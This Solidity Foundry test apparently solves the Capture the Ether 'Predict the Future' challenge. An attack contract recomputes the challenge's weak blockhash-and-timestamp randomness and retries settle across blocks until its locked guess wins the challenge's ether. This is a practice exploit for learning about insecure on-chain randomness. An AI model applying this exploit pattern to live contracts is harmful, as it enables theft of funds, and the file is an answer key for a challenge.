// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {PredictTheFutureChallenge} from "../../src/1-Lotteries/5-PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    address challengeAddress;

    function setUp() public {
        PredictTheFutureChallenge challenge = new PredictTheFutureChallenge{value: 1 ether}();
        challengeAddress = payable(address(challenge));
    }

    function testSolvePredictTheFuture() public {
        PredictTheFutureChallenge challenge = PredictTheFutureChallenge(payable(challengeAddress));

        // [START]

        // 1. Deploy attack contract
        PredictTheFutureAttack attacker = new PredictTheFutureAttack(address(challenge));

        vm.deal(address(attacker), 1 ether);

        // 2. Lock in guess
        attacker.lockInGuess{value: 1 ether}();

        // 3. Settle
        for (uint256 i = 0; i < 20; i++) {
            vm.roll(block.number + 1); // advance to next block
            try attacker.settle() {
                console.log("Block number: ", vm.getBlockNumber());
                break;
            } catch {}
        }

        // [END]

        assertTrue(challenge.isComplete());
    }
}

interface IPredictTheFuture {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

// Attack contract
contract PredictTheFutureAttack {
    IPredictTheFuture target;
    uint8 guess = 7;

    constructor(address _target) public {
        target = IPredictTheFuture(_target);
    }

    function lockInGuess() external payable {
        target.lockInGuess{value: 1 ether}(guess);
    }

    function settle() external {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        // console.log("answer: ", answer);
        require(guess == answer, "Wrong answer");
        target.settle();
    }

    receive() external payable {}
}
